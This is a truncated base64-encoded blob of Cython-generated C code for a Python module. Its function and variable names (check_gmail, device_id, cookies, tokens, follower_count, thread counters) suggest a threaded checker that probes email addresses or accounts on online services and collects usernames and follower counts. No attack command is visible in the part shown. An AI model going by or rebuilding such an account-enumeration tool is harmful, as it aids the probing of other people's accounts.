XFxyXFwzMzBcXDAyMFxcMDM3XFwzMjBcXDAzN2NcXDMyMGNkXFwzMzBcXDAyMFxcMDI0XFwyMjBGXFwyMzAhXFwzMzBcXDAyNFxcIlxcMjQwIVxcMzMwXFwwMjRcXDAzNFxcMjMwQVxcMzMwXFwwMjRcXDAzNFxcMjMwQVxcMzMwXFwwMjQhXFwyNDBcXDAyMVxcMzMwXFwwMjRcXDAzNVxcMjMwUVxcMzQwXFwwMjAmXFwyNDBhXFwzNDBcXDAxNFxcMDI3XFwyMjB4XFwyMzB1XFwyNDBBXFwzMzBcXDAyMFVcXDMyMFVdXFwzMjBdZlxcMzIwZmtcXDMyMGtxXFwzMjBxeVxcMzIweXpcXDMzMFxcMDE0XFwwMjBcXDIyMFxcMDEwXFwyMzBcXDAwNVxcMjMwUlxcMjMwdFxcMjQwMVxcMjQwSVxcMjUwUVxcMzMwXFwwMTRcXDAyM1xcMjIwMVxcMzMwXFwwMTBcXDAxN1xcMjEwfVxcMjMwQVxcMzMwXFwwMTRcXDAyMVxcMjIwXFwwMjFcXDIyMCFcXDMzMFxcMDE0XFwwMjNcXDIyMDFcXDIwMEFcXDMzMFxcMDEwXFwwMTdcXDIxMHdcXDIyMGxcXDI0MCFcXDMzMFxcMDEwXFwwMTdcXDIxMHNcXDIyMCFcXDIyMDZcXDIzMFxcMDMyXFwyNDAxXFwyNDBHXFwyNTAxXFwyMzBRXFwyMzBcXDAwMVxcMjAwXFwwMDFcXDMzMFxcMDA0XFx0XFwyMTBcXDAyMVxcMjEwIVxcMzMwXFwwMDRcXDAwNlxcMjAwZlxcMjEwQVxcMjEwUSI7XG4gICAgUHlPYmplY3QgKmRhdGEgPSBOVUxMO1xuICAgIENZVEhPTl9VTlVTRURfVkFSKF9fUHl4X0RlY29tcHJlc3NTdHJpbmcpO1xuICAgICNlbmRpZlxuICAgIFB5T2JqZWN0ICoqc3RyaW5ndGFiID0gX19weXhfbXN0YXRlLT5fX3B5eF9zdHJpbmdfdGFiO1xuICAgIFB5X3NzaXplX3QgcG9zID0gMDtcbiAgICBmb3IgKGludCBpID0gMDsgaSA8IDQ0NDsgaSsrKSB7XG4gICAgICBQeV9zc2l6ZV90IGJ5dGVzX2xlbmd0aCA9IGluZGV4W2ldLmxlbmd0aDtcbiAgICAgIFB5T2JqZWN0ICpzdHJpbmcgPSBQeVVuaWNvZGVfRGVjb2RlVVRGOChieXRlcyArIHBvcywgYnl0ZXNfbGVuZ3RoLCBOVUxMKTtcbiAgICAgIGlmIChsaWtlbHkoc3RyaW5nKSAmJiBpID49IDE0OCkgUHlVbmljb2RlX0ludGVybkluUGxhY2UoJnN0cmluZyk7XG4gICAgICBpZiAodW5saWtlbHkoIXN0cmluZykpIHtcbiAgICAgICAgUHlfWERFQ1JFRihkYXRhKTtcbiAgICAgICAgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgICAgfVxuICAgICAgc3RyaW5ndGFiW2ldID0gc3RyaW5nO1xuICAgICAgcG9zICs9IGJ5dGVzX2xlbmd0aDtcbiAgICB9XG4gICAgZm9yIChpbnQgaSA9IDQ0NDsgaSA8IDQ2NDsgaSsrKSB7XG4gICAgICBQeV9zc2l6ZV90IGJ5dGVzX2xlbmd0aCA9IGluZGV4W2ldLmxlbmd0aDtcbiAgICAgIFB5T2JqZWN0ICpzdHJpbmcgPSBQeUJ5dGVzX0Zyb21TdHJpbmdBbmRTaXplKGJ5dGVzICsgcG9zLCBieXRlc19sZW5ndGgpO1xuICAgICAgc3RyaW5ndGFiW2ldID0gc3RyaW5nO1xuICAgICAgcG9zICs9IGJ5dGVzX2xlbmd0aDtcbiAgICAgIGlmICh1bmxpa2VseSghc3RyaW5nKSkge1xuICAgICAgICBQeV9YREVDUkVGKGRhdGEpO1xuICAgICAgICBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gICAgICB9XG4gICAgfVxuICAgIFB5X1hERUNSRUYoZGF0YSk7XG4gICAgZm9yIChQeV9zc2l6ZV90IGkgPSAwOyBpIDwgNDY0OyBpKyspIHtcbiAgICAgIGlmICh1bmxpa2VseShQeU9iamVjdF9IYXNoKHN0cmluZ3RhYltpXSkgPT0gLTEpKSB7XG4gICAgICAgIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgICAgIH1cbiAgICB9XG4gICAgI2lmIENZVEhPTl9JTU1PUlRBTF9DT05TVEFOVFNcbiAgICB7XG4gICAgICBQeU9iamVjdCAqKnRhYmxlID0gc3RyaW5ndGFiICsgNDQ0O1xuICAgICAgZm9yIChQeV9zc2l6ZV90IGk9MDsgaTwyMDsgKytpKSB7XG4gICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgICAgICBQeV9TRVRfUkVGQ05UKHRhYmxlW2ldLCBfUHlfSU1NT1JUQUxfUkVGQ05UX0xPQ0FMKTtcbiAgICAgICAgI2Vsc2VcbiAgICAgICAgUHlfU0VUX1JFRkNOVCh0YWJsZVtpXSwgX1B5X0lNTU9SVEFMX0lOSVRJQUxfUkVGQ05UKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICB9XG4gICAgfVxuICAgICNlbmRpZlxuICB9XG4gIHtcbiAgICBQeU9iamVjdCAqKm51bWJlcnRhYiA9IF9fcHl4X21zdGF0ZS0+X19weXhfbnVtYmVyX3RhYiArIDA7XG4gICAgaW50OF90IGNvbnN0IGNpbnRfY29uc3RhbnRzXzFbXSA9IHswLDEsMiwzLDYsOSwxMCwxNSwxNiwzMCwzMiwxMDAsMTExfTtcbiAgICBpbnQxNl90IGNvbnN0IGNpbnRfY29uc3RhbnRzXzJbXSA9IHsxNTAsMjAwLDk5OSwxMzAwLDIwMDAsMjAxMCwyMDExLDIwMTIsMjAxMywyMDE0LDIwMTUsMjAxNiwyMDE3LDIwMTgsMjAxOX07XG4gICAgaW50MzJfdCBjb25zdCBjaW50X2NvbnN0YW50c180W10gPSB7MTI3OTAwMEwsMTI3OTAwMUwsMTc3NTAwMDBMLDE3NzUwMDAxTCwyNzk3NjAwMDBMLDI3OTc2MDAwMUwsOTAwOTkwMDAwTCw5MDA5OTAwMDFMLDE2MjkwMTAwMDBMLDE5MDAwMDAwMDBMfTtcbiAgICBpbnQ2NF90IGNvbnN0IGNpbnRfY29uc3RhbnRzXzhbXSA9IHsyNTAwMDAwMDAwTEwsMzcxMzY2ODc4NkxMLDU2OTk3ODUyMTdMTCw4NTA3OTQwNjM0TEwsMjEyNTQwMjk4MzRMTH07XG4gICAgZm9yIChpbnQgaSA9IDA7IGkgPCA0MzsgaSsrKSB7XG4gICAgICBudW1iZXJ0YWJbaV0gPSBQeUxvbmdfRnJvbUxvbmdMb25nKChpIDwgMTMgPyBjaW50X2NvbnN0YW50c18xW2kgLSAwXSA6IChpIDwgMjggPyBjaW50X2NvbnN0YW50c18yW2kgLSAxM10gOiAoaSA8IDM4ID8gY2ludF9jb25zdGFudHNfNFtpIC0gMjhdIDogY2ludF9jb25zdGFudHNfOFtpIC0gMzhdKSkpKTtcbiAgICAgIGlmICh1bmxpa2VseSghbnVtYmVydGFiW2ldKSkgX19QWVhfRVJSKDAsIDEsIF9fcHl4X0wxX2Vycm9yKVxuICAgIH1cbiAgfVxuICAjaWYgQ1lUSE9OX0lNTU9SVEFMX0NPTlNUQU5UU1xuICB7XG4gICAgUHlPYmplY3QgKip0YWJsZSA9IF9fcHl4X21zdGF0ZS0+X19weXhfbnVtYmVyX3RhYjtcbiAgICBmb3IgKFB5X3NzaXplX3QgaT0wOyBpPDQzOyArK2kpIHtcbiAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT05fRlJFRVRIUkVBRElOR1xuICAgICAgUHlfU0VUX1JFRkNOVCh0YWJsZVtpXSwgX1B5X0lNTU9SVEFMX1JFRkNOVF9MT0NBTCk7XG4gICAgICAjZWxzZVxuICAgICAgUHlfU0VUX1JFRkNOVCh0YWJsZVtpXSwgX1B5X0lNTU9SVEFMX0lOSVRJQUxfUkVGQ05UKTtcbiAgICAgICNlbmRpZlxuICAgIH1cbiAgfVxuICAjZW5kaWZcbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgcmV0dXJuIC0xO1xufVxuXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgdW5zaWduZWQgaW50IGFyZ2NvdW50IDogMjtcbiAgICB1bnNpZ25lZCBpbnQgbnVtX3Bvc29ubHlfYXJncyA6IDE7XG4gICAgdW5zaWduZWQgaW50IG51bV9rd29ubHlfYXJncyA6IDE7XG4gICAgdW5zaWduZWQgaW50IG5sb2NhbHMgOiA1O1xuICAgIHVuc2lnbmVkIGludCBmbGFncyA6IDEwO1xuICAgIHVuc2lnbmVkIGludCBmaXJzdF9saW5lIDogOTtcbn0gX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbjtcblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeUNvZGVfTmV3KFxuICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLFxuICAgICAgICBQeU9iamVjdCAqIGNvbnN0ICp2YXJuYW1lcyxcbiAgICAgICAgUHlPYmplY3QgKmZpbGVuYW1lLFxuICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsXG4gICAgICAgIFB5T2JqZWN0ICpsaW5lX3RhYmxlLFxuICAgICAgICBQeU9iamVjdCAqdHVwbGVfZGVkdXBfbWFwXG4pO1xuXG5cbnN0YXRpYyBpbnQgX19QeXhfQ3JlYXRlQ29kZU9iamVjdHMoX19weXhfbXN0YXRldHlwZSAqX19weXhfbXN0YXRlKSB7XG4gIFB5T2JqZWN0KiB0dXBsZV9kZWR1cF9tYXAgPSBQeURpY3RfTmV3KCk7XG4gIGlmICh1bmxpa2VseSghdHVwbGVfZGVkdXBfbWFwKSkgcmV0dXJuIC0xO1xuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDg0fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90dF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxXzFfMiwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFN8Q09fR0VORVJBVE9SKSwgODV9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2l9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX2JfaXNvODg1OTFfMV8yLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCA4Nn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdHRfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfYl9pc284ODU5MV9RLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCA0MzR9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1dHVyZX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdHRfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfYl9pc284ODU5MV9fMTYsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNDl9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGZ9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pbml0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX2JfaXNvODg1OTFfQV9JUV9LcV9NX0ZfQV9RX0FfYV9hX2FfSElVX0txLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDY3fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9rZXl9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzVdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pbmNyZW1lbnRfY291bnRlciwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNV0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsyLCAwLCAwLCAyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNzF9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGYsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NvdW50fTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90dF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2V0X2FjdGl2ZV90aHJlYWRzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX2JfaXNvODg1OTFfQV9RLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzZdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDc1fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9rZXl9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZXRfY291bnRlciwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0FfNHhxLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDc5fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zZWxmfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls4XSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90dF9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfY3JlYXRlX2Jhbm5lciwgX19weXhfbXN0YXRlLT5fX3B5eF9rcF9iX2lzbzg4NTkxX0FfUV8yLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzhdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgMjAsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCA4Mn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbjEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X24yLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9ob3N0LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZTMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JlczEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X21hdGNoLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90b2ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Nvb2tpZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90bF9tYXRjaCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2YsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHJ9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX3R0X3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90bGwsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfYl9pc284ODU5MV9BXzVfMV81XzFfMlVfUV9XXzdxX1ZWbm5zX3RfQl9CLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzldKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMTcsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAxMTl9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X3NlbGYsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9vcmlnaW5hbF9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hvc3QsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Nvb2tpZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3BhcmFtcywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9mb2xsb3dlcl9jb3VudCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb2ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dnLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdHRfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NoZWNrX2dtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX2JfaXNvODg1OTFfQV9RX3QzYV8xRl9RYV9IQV9iXzJRYV9IQV9iXzJRYSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMF0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsyLCAwLCAwLCAxMiwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDE3NH07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZW1haWwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kZXYsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RldmljZV9pZCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXVpLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2ZvbGxvd2VyX2NvdW50LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fdHRfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NoZWNrLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX2JfaXNvODg1OTFfQV9BX0FfdDFDcV9GX1dDel8yUV9RZF9hX2NjZF9GX0EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTFdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgNywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDIyMn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfc2VsZiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzcG9uc2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3IsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2V9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEyXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV90dF9weSwgX19weXhfbXN0YXR